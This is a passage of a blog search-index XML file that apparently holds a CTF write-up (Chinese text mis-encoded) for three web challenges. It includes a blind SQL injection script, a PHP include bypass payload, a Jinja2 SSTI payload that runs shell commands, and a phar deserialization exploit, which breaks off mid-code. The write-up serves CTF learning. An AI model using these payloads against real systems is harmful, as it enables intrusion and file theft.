<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å·…å³°æå®¢2020 éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/"/>
      <url>2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/</url>
      
        <content type="html"><![CDATA[<p>å››é“é¢˜åšäº†ä¸‰é“è¿˜è¡Œï¼ğŸ¤­</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h3><p>sqlæ³¨å…¥ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union and select &#39; &quot; - &#x3D; like &amp; mid</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤å•åŒå¼•å·ï¼Œé©¬ä¸Šæƒ³åˆ°<code>\</code>ï¼Œå‘ç°å¯ä»¥å¸ƒå°”ç›²æ³¨ï¼Œç›²çŒœå¯†ç å­—æ®µä¸º<code>password</code>ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://eci-2zedr7xc8tymr58mx2vp.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;or if((ord(substr(password,&#123;&#125;,1))&gt;&#123;&#125;),1,0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;or if((ord(substr(password,&#123;&#125;,1)) in (&#123;&#125;)),1,0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> len(r1.text)!=<span class="number">2984</span>:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> len(r.text)==<span class="number">2984</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> len(r.text)!=<span class="number">2984</span>:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>æ³¨å‡ºå¯†ç ä¸º<code>uAreRigHt</code>ï¼Œç™»é™†å‘ç°æ˜¯ä¸ªä»£ç æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($command.<span class="string">&quot;=false&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”è¿‡æ»¤äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç©ºæ ¼ ^ &#39; &quot; ( </span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥åŒ…å«ï¼Œpayloadï¼Œå–åéƒ¨åˆ†ä¸º<code>/flag</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command&#x3D;include~%D0%99%93%9E%98?&gt;</span><br></pre></td></tr></table></figure><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>ç™»é™†çš„åœ°æ–¹åŒæˆ·åsstiï¼Œå‰ç«¯jséªŒè¯</p><p>ç›´æ¥pç¥çš„payloadå°±å¯ä»¥æ‰“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loged?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h3><p>æ‰«ç›®å½•å‘ç°<code>www.zip</code>,<code>classes.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $uploader=<span class="keyword">new</span> Upload();</span><br><span class="line">        $uploader-&gt;upload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $reader=<span class="keyword">new</span> reader();</span><br><span class="line">        $reader-&gt;read($_POST[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql=<span class="string">&quot;select id,password from users where username=?&quot;</span>;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;black_list = [<span class="string">&#x27;ph&#x27;</span>, <span class="string">&#x27;ht&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;pe&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;co&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $ext = substr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], strpos($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        $reg=implode(<span class="string">&quot;|&quot;</span>,<span class="keyword">$this</span>-&gt;black_list);</span><br><span class="line">        $reg = <span class="string">&quot;/&quot;</span> . $reg . <span class="string">&quot;\x|\s|[\x01-\x20]/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match($reg, $ext))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $ext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">10240</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;too big&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            $new_addr = $_SERVER[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] . <span class="string">&quot;/upload/&quot;</span> . md5($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">                            <span class="keyword">echo</span> $new_addr;</span><br><span class="line">                            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $new_addr);</span><br><span class="line">                            <span class="keyword">return</span> $new_addr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $result;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æƒ³å¤šäº†å—·&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/sh/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name,$val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>upload.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=<span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;upload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>read.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=<span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜æ˜¾pharååºåˆ—åŒ–ï¼Œå…ˆçœ‹ä¸‹popé“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbCtrl::__destruct() -&gt; User::__toString() -&gt; $this-&gt;nickname-&gt;backup&#x3D;$this-&gt;backup -&gt; __set($name,$val)</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†å‰ç¼€ï¼Œè¿™ä¸ªåœ°æ–¹å¯ä»¥å°†å…¶ä»–åè®®æµæ”¾åœ¨å‰é¢ç»•è¿‡ï¼Œæ³¨æ„pharæŒ‡å‘çš„æ–‡ä»¶ä¸èƒ½æ²¡åç¼€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Reader;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;backup = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span 